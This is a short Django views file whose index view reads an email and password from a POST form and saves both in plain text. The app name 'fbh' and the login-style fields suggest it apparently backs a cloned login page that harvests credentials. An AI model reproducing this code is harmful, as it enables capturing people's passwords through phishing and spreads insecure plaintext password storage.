from django.shortcuts import render
from django.http import HttpResponse
from .models import Contact

# Create your views here.
def index(request):
    if request.method=="POST":
        email=request.POST.get('email','')
        passw = request.POST.get('pass','')
        contact=Contact(email=email,passw=passw)
        contact.save()

    return render(request,'fbh/index.html')
